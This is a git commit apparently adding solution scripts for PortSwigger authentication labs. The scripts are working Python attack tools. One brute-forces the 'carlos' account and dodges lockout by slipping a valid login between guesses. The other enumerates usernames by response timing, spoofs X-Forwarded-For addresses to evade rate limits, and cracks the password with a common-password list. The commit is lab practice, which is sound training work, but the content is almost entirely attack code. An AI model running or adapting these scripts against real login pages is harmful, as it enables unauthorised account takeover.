94cb0c5cda46e80478b1b55efc75ef1028e19ea4
mayank922 <rajmayank432@gmail.com>
2026-06-19 20:56:44 -0500

    Auth-Solves

---
+++ Portswigger-Labs/Authentication/Broken_bruteforce_protection.py
@@ -0,0 +1,33 @@
+"""
+
+Logic: In each loop iteration send a correct and incorrect, so first it resets then it tries
+
+"""
+
+
+import requests
+from bs4 import BeautifulSoup
+
+lab_url = str(input('Enter the target URL:' ))
+
+passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]
+
+with requests.session() as ses:
+
+    def password_brute(url, password_list):
+        pass_found = ""
+        for i in range(0, len(password_list)):
+            if (i%2==0):
+                bodi = { "username": "wiener", "password": "peter"}
+                req = ses.post(url , data=bodi, allow_redirects=False)
+            
+            bodi2 = { "username": "carlos", "password": password_list[i]}
+            cracked_req = ses.post(url , data=bodi2, allow_redirects=False)
+            if(cracked_req.status_code == 302):
+                print(password_list[i])
+
+
+
+
+
+password_brute(lab_url, passwords)
--- Portswigger-Labs/Authentication/Username_enumeration_via_response_timing.py
+++ Portswigger-Labs/Authentication/Username_enumeration_via_response_timing.py
@@ -1,54 +1,66 @@
 """
-The response length with correct useraname changes
+Change the IP : ip = "8.8.8." + str(i) ; header = {"X-Forwarded-For" : ip}
+Response timing: (req.elapsed.microseconds//1000)
 """
 
-
 import requests
-from bs4 import BeautifulSoup
+import time
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 lab_url = str(input('Enter the target URL:' ))
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+    }
 
 users = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]
 passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]
 
 with requests.session() as ses:
 
-#Finds the changes in response length and find the correct username
-    def usernameenum(url, users):
-        response_length = []
+    
+
+#Finds the changes in response time and find the correct username
+    def usernameenum(url, users, proxies):
+        response_time = []
         username = ""
-        for i in users:
-            bodi = { "username": i, "password": "abcd" }
-            req = ses.post(url , data=bodi)
-            if (len(response_length) == 0):
-                response_length.append(len(req.content))
 
-            if (len(req.content) > response_length[0]):
-                response_length.append(len(req.content))
-                username = i
-        print(f'Username found: {username} ')
-        return username
+        for i in range( 0, len(users)):
+            bodi = { "username": users[i], "password": "abcddcndcjkndckjncdsjkcndckljcnsdklcndslkcmdslkcmdkslcmscnkjlsdcnkdcnaoncksdjcnvajkdfvndjfvnjdfvnjdsfvnjksdfvnkjdfvnkdlsfvksfvndfkjvdnfskvjdnfvlkjfv" }
+            ip = "8.8.8." + str(i)
+            header = {"X-Forwarded-For" : ip}
+            start = time.time()
+            req = ses.post(url , data=bodi, headers=header , proxies=proxies , verify=False)
+            if (len(response_time) == 0):
+                response_time.append((req.elapsed.microseconds//1000))
+            
+            if((req.elapsed.microseconds//1000)>response_time[0]):
+                response_time.append((req.elapsed.microseconds//1000))
+                username = users[i]
         
+        print("Username found")
+        
+        return username
 
-# With correct username, bruteforce the correct password
     def get_pass(url , user , passw):
         pass_found = ""
-        for i in passw:
-            bodi = { "username": user, "password": i}
-            req = ses.post(url , data=bodi, allow_redirects=False)
+        for i in range( 0, len(passw)):
+            bodi = { "username": user, "password": passw[i]}
+            ip = "8.8.8." + str(i)
+            header = {"X-Forwarded-For" : ip}
+            req = ses.post(url , data=bodi, allow_redirects=False, headers=header)
             if(req.status_code == 302):
-                pass_found = i
+                pass_found = passw[i]
         
         return(pass_found)
 
 
+found_user = usernameenum(lab_url, users=users, proxies=proxies)
+found_pass = get_pass(lab_url, found_user, passwords)
 
-correct_useranme = usernameenum(lab_url, users)
-correct_password = get_pass(lab_url,correct_useranme, passwords)
-print(f'Cracked username and passowrd is {correct_useranme} , {correct_password}')
-
-bodi = { "username": correct_useranme, "password": correct_password}
-final_req = requests.post(url= lab_url , data= bodi)
-print(final_req.text)
+print(f'Username is: {found_user} and password is {found_pass}')
 
 
